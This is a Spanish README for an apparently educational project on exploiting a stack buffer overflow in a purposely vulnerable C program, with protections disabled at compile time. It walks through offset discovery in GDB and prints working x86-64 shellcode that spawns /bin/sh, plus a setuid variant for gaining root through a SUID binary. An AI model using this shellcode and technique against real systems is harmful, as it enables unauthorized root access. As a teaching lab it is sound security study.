# Buffer Overflow Exploitation

Este proyecto muestra cómo explotar una vulnerabilidad de tipo **stack buffer overflow** para ejecutar código arbitrario, obteniendo una shell local y escalando privilegios con el bit **SUID** activado.

---

## Contenido del proyecto

- `vulnerable.c`: binario vulnerable que copia la entrada del usuario a un buffer sin control de límites.
- `exploit.c`: código que construye un payload para ejecutar una shell local (`/bin/sh`).
- `exploit_suid.c`: versión del exploit adaptada para binarios con el bit SUID activado.
- `exploit.asm`: shellcode necesario para lanzar `/bin/sh` sin escalada de privilegios.
- `exploit_suid.asm`: shellcode que primero ejecuta `setuid(geteuid())` y luego lanza la shell.

---

## Parte 1: Ejecución de shell local

### Análisis del binario vulnerable

El binario vulnerable contiene el siguiente código:

```c
void function(char *input) {
    char buffer[64];
    strcpy(buffer, input); // ¡Sin comprobación de límites!
}
```

La vulnerabilidad está en el uso de `strcpy`, que copia sin verificar tamaño.

Esto permite que un atacante sobrescriba la dirección de retorno (RIP) en la pila
al introducir más de 64 bytes, redirigiendo el flujo de ejecución hacia código 
arbitrario como una shellcode.

---

### Cálculo del offset

Para determinar el desplazamiento hasta RIP, iniciamos GDB:

```bash
gdb ./vulnerable
```

Y colocamos un breakpoint justo después del `strcpy` y ejecutamos con diferentes longitudes (mayor que 64 y multiplo de 8) hasta dar con la que sobreescriba el rip, en este caso es 80:

```bash
(gdb) b *main+36
(gdb) run $(python3 -c 'print("A"*80)')
```

Cuando el programa se detenga, usamos el siguiente comando para ver el contenido del `rip`:

```bash
(gdb) info frame
```

Veremos `rip = 0x4141414141414141`, lo que indica que las 'A' lo han sobrescrito.
Así confirmamos que el offset es de 72 bytes (80 - 8 de dirección de retorno).

Tambien se puede visualizar la pila con:

```bash
(gdb) x/20x $rsp + 16
0x7fffffffef7d: 41414141 ...
```

---

### Dirección de retorno al buffer

Para ejecutar shellcode, debemos redirigir el flujo a la dirección del buffer.
Es importante obtener esta dirección desde `gdb ./exploit` y no desde `gdb ./vulnerable`.

Esto se debe a que el binario `exploit` reserva y posiciona el buffer en memoria,
y la dirección cambia dependiendo de qué ejecutable lo contenga.

```bash
gdb ./exploit
```

Coloca breakpoints al inicio del código para inspeccionarlo y ejecútalo:

```bash
(gdb) b main
(gdb) r
```

Luego, avanza paso a paso con `next` (`n`) hasta entrar en la ejecución de `vulnerable.c`, donde tendrás otro breakpoint por comenzar el `main` de ese programa.

En ese punto deberías de comprobar que se han pasado 2 argumentos. El segundo argumento muestra la direccion de inicio del buffer:

```bash
(gdb) print argc
$1 = 2
(gdb) print argv[1]
$2 = 0x7fffffffef7d ...
```

Usaremos esa dirección como la nueva dirección de retorno al final del payload.

---

### Shellcode utilizada

La shellcode realiza una llamada directa a `execve("/bin/sh", NULL, NULL)`:

```asm
"\x48\x31\xc0"                              // xor    rax, rax
"\xb0\x3b"                                  // mov    al, 0x3b
"\x48\x31\xff"                              // xor    rdi, rdi
"\x57"                                      // push   rdi
"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68"  // mov    rdi, "//bin/sh"
"\x57"                                      // push   rdi
"\x48\x89\xe7"                              // mov    rdi, rsp
"\x48\x31\xf6"                              // xor    rsi, rsi
"\x48\x31\xd2"                              // xor    rdx, rdx
"\x0f\x05"                                  // syscall
```

---

### Estructura del payload

El payload está compuesto por:

1. NOP sled: una secuencia de bytes `\x90` para aumentar tolerancia al salto.
2. Shellcode: las instrucciones que ejecutan `/bin/sh`.
3. Dirección de retorno: apunta al NOP sled o directamente al shellcode.

Esta estructura es robusta, ya que incluso si el salto no es exacto,
caerá en la zona NOP y terminará ejecutando la shellcode igualmente.

---

### Compilación

```bash
gcc -fno-stack-protector -z execstack -no-pie -fno-pic -g -o vulnerable vulnerable.c
gcc -o exploit exploit.c
```

---

### Ejecucion

```bash
./exploit
$
```

A partir de ahora, tenemos acceso a una terminal de la victima, que se puede comprobar haciendo:

```bash
$ whoami
user
```

---

## Parte 2: Explotación de binario con bit SUID

En esta fase se explota un binario con el bit SUID activado (propiedad de root), lo que permite heredar sus privilegios al ejecutar la shellcode.

### Preparación del binario

```bash
sudo chown root:root vulnerable
sudo chmod u+s vulnerable
```

---

### Shellcode extendido

La shellcode utilizada añade una llamada a `setuid(geteuid())` justo antes de ejecutar `/bin/sh`. Esto garantiza que la shell heredada mantenga los privilegios elevados otorgados por el bit SUID.

```asm
// -- setuid(geteuid()) --
"\x48\x31\xff"                              // xor    rdi, rdi
"\x48\x31\xc0"                              // xor    rax, rax
"\xb0\x69"                                  // mov    al, 0x69 (setuid)
"\x0f\x05"                                  // syscall
// -- execve("/bin/sh", NULL, NULL) -- ya utilizada en la parte 1 --
"\x48\x31\xc0"                              // xor    rax, rax
"\xb0\x3b"                                  // mov    al, 0x3b
"\x48\x31\xff"                              // xor    rdi, rdi
"\x57"                                      // push   rdi
"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68"  // mov    rdi, "//bin/sh"
"\x57"                                      // push   rdi
"\x48\x89\xe7"                              // mov    rdi, rsp
"\x48\x31\xf6"                              // xor    rsi, rsi
"\x48\x31\xd2"                              // xor    rdx, rdx
"\x0f\x05"                                  // syscall
```

---

### Compilación

```bash
gcc -fno-stack-protector -z execstack -no-pie -fno-pic -g -o vulnerable vulnerable.c
gcc -o exploit_suid exploit_suid.c
```

---

### Ejecución

```bash
./exploit
#
```

A partir de ahora tenemos acceso a una terminal de la victima con permisos de root, que se puede comprobar haciendo:

```bash
# whoami
root
```

---

## Archivos adicionales

- **`exploit.asm`**: contiene exclusivamente el shellcode de ejecución de `/bin/sh` mediante `execve`, sin escalada de privilegios.
- **`exploit_suid.asm`**: contiene la variante del shellcode que incluye la syscall `setuid(geteuid())` seguida de `execve("/bin/sh", NULL, NULL)` para asegurar la herencia de privilegios cuando el binario explotado tiene el bit SUID activado.

---

## Autor

**Julen Casajús**  
[GitHub Profile](https://github.com/JulenCasajus)
